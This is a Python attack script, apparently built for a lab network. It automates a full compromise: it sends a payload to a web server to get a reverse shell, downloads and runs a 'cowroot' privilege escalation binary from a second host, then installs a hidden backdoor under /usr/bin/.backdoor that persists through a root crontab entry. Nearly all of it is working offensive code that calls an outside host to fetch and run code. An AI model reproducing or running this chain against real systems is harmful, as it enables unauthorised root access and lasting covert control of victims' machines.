#!/usr/bin/python

import pexpect
import time
import os
import socket

HOST = "10.10.1.5"
PORT = 80
SIZE = 1024

print "####################################"
print "##Outside Threat Exploitation Tool##"
print "####################################"

def SpawnShell():
	print "[+] starting listener"
        child = pexpect.spawn("./listen.sh")
        child.expect("listening")
        child.sendcontrol("c")
        time.sleep(2)
        print "[+] listener successfully started"

        # Building a socket to send the raw data in
        # payload file in this directory, then sending it
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        f = open('payload')
        l = f.read(SIZE)
        while(l):
                s.send(l)
                l = f.read(SIZE)
        f.close()
        print "[+] payload send"
        time.sleep(30)

        child.expect("connect")
        child.sendcontrol("c")

        # checking if we have succesfully exploited
        # the target, out_file should contain "nobody"
        SendToPipe("whoami", 3, 3)
        
	CheckOutFile("nobody")

def EscalateToRoot():
        SendToPipe("cd /tmp")
        print "[+] downloading root escalation script"
        SendToPipe("wget http://10.10.2.100/cowroot", 1, 5)
        SendToPipe("ls -l")
        CheckOutFile("saved [11384/11384]")
        SendToPipe("chmod 700 cowroot")
        print "[+] executing escalation script"
        SendToPipe("./cowroot", 1, 5)
        SendToPipe("id", 1, 3)
        CheckOutFile("uid=0(root)")
        print "[+] w00tw00t we are r00t"

def CreateBackdoor():
        print "[+] downloading backdoor"
        SendToPipe("cd /usr/bin")
        SendToPipe("mkdir .backdoor")
        SendToPipe("cd .backdoor")
        SendToPipe("wget http://10.10.2.100/hello.sh", 1, 5)
        CheckOutFile("saved [459/459]")
        print "[+] installing backdoor"
        SendToPipe("chmod 700 hello.sh")
        SendToPipe("wget http://10.10.2.100/install.sh", 1, 5)
        CheckOutFile("saved [81/81]")
        SendToPipe("chmod 700 install.sh")
        SendToPipe("bash install.sh")
        SendToPipe("rm install.sh")
        print "[+] checking for backdoor"
        SendToPipe("tail -n5 /etc/crontab")
        CheckOutFile("* * * root /usr/bin/.backdoor/hello.sh")
        print "[+] successfully installed backdoor"
        

# This function sends the command to the named pipe an x number
# of times and waits y period afterwards
def SendToPipe(command, repeats = 1, sleeptime = 1):
        for i in range(0, repeats):
                os.system("echo \'" + command + "\' > /tmp/pipe")
        time.sleep(sleeptime)

# Checks if a certain value is found in out.txt,
# meaning the command send before executed successfully,
# if this check fails the application will exit.
def CheckOutFile(checkval):
        if checkval in open("out.txt").read():
                print "[+] OK - " + checkval
        else:
                print "[-] NOK - " + checkval
                exit(1)

print "++++ Menu ++++"
print "[1] start fragmentation and exploit the target"
print "[2] exit the script"

s = int(raw_input('Please choose what to do next:'))

if s == 1:
	SpawnShell() # execute listener
	raw_input("Press enter to continue: ")
	EscalateToRoot()
	raw_input("Press enter to continue: ")
	CreateBackdoor()
else:
	exit(1)
